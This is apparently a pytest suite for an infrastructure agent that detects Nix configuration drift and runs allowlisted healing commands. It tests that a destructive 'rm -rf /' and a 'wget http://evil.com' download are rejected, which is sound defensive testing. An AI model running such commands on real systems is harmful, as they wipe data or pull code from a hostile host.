"""Tests for ChimeraAgent."""

import os
import stat
import tempfile
import pytest
from unittest.mock import patch, AsyncMock
from chimera.infrastructure.agent.chimera_agent import (
    ChimeraAgent,
    AgentConfig,
    AgentStatus,
    DriftSeverity,
    NodeHealth,
    DriftReport,
    _validate_healing_command,
    _validate_healing_file,
    ALLOWED_COMMANDS,
    HEALING_DIR,
)


class TestAgentConfig:
    def test_defaults(self):
        config = AgentConfig(node_id="node-1")
        assert config.heartbeat_interval == 5
        assert config.drift_check_interval == 30
        assert config.auto_heal is True
        assert config.log_level == "INFO"


class TestNodeHealth:
    def test_healthy(self):
        h = NodeHealth(node_id="n1", status=AgentStatus.HEALTHY)
        assert h.is_healthy
        assert not h.has_drift

    def test_has_drift(self):
        h = NodeHealth(
            node_id="n1",
            status=AgentStatus.DRIFT_DETECTED,
            current_hash="aaa",
            expected_hash="bbb",
        )
        assert h.has_drift

    def test_no_drift_matching_hashes(self):
        h = NodeHealth(
            node_id="n1",
            status=AgentStatus.HEALTHY,
            current_hash="aaa",
            expected_hash="aaa",
        )
        assert not h.has_drift

    def test_no_drift_no_hashes(self):
        h = NodeHealth(node_id="n1", status=AgentStatus.UNKNOWN)
        assert not h.has_drift


class TestDriftReport:
    def test_drift(self):
        r = DriftReport(
            node_id="n1",
            expected_hash="aaa",
            actual_hash="bbb",
            severity=DriftSeverity.HIGH,
        )
        assert r.is_drift

    def test_no_drift(self):
        r = DriftReport(
            node_id="n1",
            expected_hash="aaa",
            actual_hash="aaa",
            severity=DriftSeverity.LOW,
        )
        assert not r.is_drift


class TestChimeraAgent:
    def test_init(self):
        config = AgentConfig(node_id="test-node")
        agent = ChimeraAgent(config)
        assert agent.node_id == "test-node"
        assert agent.health.status == AgentStatus.UNKNOWN

    def test_to_dict(self):
        config = AgentConfig(node_id="test-node")
        agent = ChimeraAgent(config)
        d = agent.to_dict()
        assert d["node_id"] == "test-node"
        assert d["status"] == "UNKNOWN"
        assert d["drift_report"] is None

    def test_to_dict_with_drift(self):
        config = AgentConfig(node_id="test-node")
        agent = ChimeraAgent(config)
        agent._last_drift_report = DriftReport(
            node_id="test-node",
            expected_hash="aaa",
            actual_hash="bbb",
            severity=DriftSeverity.HIGH,
            details="test drift",
        )
        d = agent.to_dict()
        assert d["drift_report"]["severity"] == "HIGH"

    def test_get_drift_report_none(self):
        config = AgentConfig(node_id="test-node")
        agent = ChimeraAgent(config)
        assert agent.get_drift_report() is None

    def test_calculate_drift_severity_critical(self):
        config = AgentConfig(node_id="test-node")
        agent = ChimeraAgent(config)
        severity = agent._calculate_drift_severity(
            "00000000000000000000000000000000", "expected"
        )
        assert severity == DriftSeverity.CRITICAL

    def test_calculate_drift_severity_high(self):
        config = AgentConfig(node_id="test-node")
        agent = ChimeraAgent(config)
        severity = agent._calculate_drift_severity("abc123", "expected")
        assert severity == DriftSeverity.HIGH

    @pytest.mark.asyncio
    async def test_start_stop(self):
        config = AgentConfig(node_id="test-node")
        agent = ChimeraAgent(config)
        await agent.start()
        assert agent._running is True
        await agent.stop()
        assert agent._running is False

    @pytest.mark.asyncio
    async def test_execute_healing_allowed(self):
        config = AgentConfig(node_id="test-node")
        agent = ChimeraAgent(config)
        with patch("subprocess.run") as mock_run:
            mock_run.return_value.returncode = 0
            await agent._execute_healing("nix-env --rollback")
            mock_run.assert_called_once()
            assert agent.health.status == AgentStatus.HEALTHY

    @pytest.mark.asyncio
    async def test_execute_healing_rejected(self):
        config = AgentConfig(node_id="test-node")
        agent = ChimeraAgent(config)
        await agent._execute_healing("rm -rf /")
        assert agent.health.status == AgentStatus.DEGRADED

    @pytest.mark.asyncio
    async def test_execute_healing_failure(self):
        config = AgentConfig(node_id="test-node")
        agent = ChimeraAgent(config)
        with patch("subprocess.run") as mock_run:
            mock_run.return_value.returncode = 1
            mock_run.return_value.stderr = "error"
            await agent._execute_healing("nix-env --rollback")
            assert agent.health.status == AgentStatus.DEGRADED

    @pytest.mark.asyncio
    async def test_get_nix_version(self):
        config = AgentConfig(node_id="test-node")
        agent = ChimeraAgent(config)
        with patch("subprocess.run") as mock_run:
            mock_run.return_value.returncode = 0
            mock_run.return_value.stdout = "nix (Nix) 2.18.1"
            version = await agent._get_nix_version()
            assert version == "nix (Nix) 2.18.1"

    @pytest.mark.asyncio
    async def test_get_nix_version_not_installed(self):
        config = AgentConfig(node_id="test-node")
        agent = ChimeraAgent(config)
        with patch("subprocess.run", side_effect=FileNotFoundError):
            version = await agent._get_nix_version()
            assert version is None

    @pytest.mark.asyncio
    async def test_get_current_hash(self):
        config = AgentConfig(node_id="test-node")
        agent = ChimeraAgent(config)
        with patch("subprocess.run") as mock_run:
            mock_run.return_value.returncode = 0
            mock_run.return_value.stdout = "/nix/store/abc123-system"
            h = await agent._get_current_hash()
            assert h is not None

    @pytest.mark.asyncio
    async def test_get_current_hash_failure(self):
        config = AgentConfig(node_id="test-node")
        agent = ChimeraAgent(config)
        with patch("subprocess.run") as mock_run:
            mock_run.return_value.returncode = 1
            mock_run.return_value.stdout = ""
            h = await agent._get_current_hash()
            assert h is None

    @pytest.mark.asyncio
    async def test_get_expected_hash_missing_file(self):
        config = AgentConfig(node_id="test-node")
        agent = ChimeraAgent(config)
        h = await agent._get_expected_hash()
        assert h is None

    @pytest.mark.asyncio
    async def test_check_drift_no_drift(self):
        config = AgentConfig(node_id="test-node")
        agent = ChimeraAgent(config)
        with patch.object(agent, "_get_current_hash", return_value="abc"), \
             patch.object(agent, "_get_expected_hash", return_value="abc"):
            await agent._check_drift()
            assert agent._last_drift_report is None

    @pytest.mark.asyncio
    async def test_check_drift_detected(self):
        config = AgentConfig(node_id="test-node")
        agent = ChimeraAgent(config)
        with patch.object(agent, "_get_current_hash", return_value="abc"), \
             patch.object(agent, "_get_expected_hash", return_value="def"):
            await agent._check_drift()
            assert agent._last_drift_report is not None
            assert agent.health.status == AgentStatus.DRIFT_DETECTED

    @pytest.mark.asyncio
    async def test_check_healing_commands_no_file(self):
        config = AgentConfig(node_id="test-node")
        agent = ChimeraAgent(config)
        # Should not raise when file doesn't exist
        await agent._check_healing_commands()

    @pytest.mark.asyncio
    async def test_emit_heartbeat(self):
        config = AgentConfig(node_id="test-node")
        agent = ChimeraAgent(config)
        with patch.object(agent, "_get_nix_version", return_value="2.18"), \
             patch.object(agent, "_get_current_hash", return_value="abc"), \
             patch.object(agent, "_get_expected_hash", return_value="abc"):
            await agent._emit_heartbeat()
            assert agent.health.status == AgentStatus.HEALTHY
            assert agent.health.nix_version == "2.18"


class TestValidateHealingCommand:
    def test_allowed_commands(self):
        for cmd in ALLOWED_COMMANDS:
            parts = _validate_healing_command(f"{cmd} --some-flag")
            assert os.path.basename(parts[0]) in ALLOWED_COMMANDS

    def test_path_prefix_allowed(self):
        parts = _validate_healing_command("/usr/bin/nix-env --rollback")
        assert parts[0] == "/usr/bin/nix-env"

    def test_rejected_command(self):
        with pytest.raises(ValueError, match="not in allowlist"):
            _validate_healing_command("wget http://evil.com")

    def test_empty_command(self):
        with pytest.raises(ValueError, match="Empty"):
            _validate_healing_command("")


class TestValidateHealingFile:
    def test_nonexistent_file(self):
        with pytest.raises(ValueError, match="Cannot stat"):
            _validate_healing_file("/nonexistent/path")
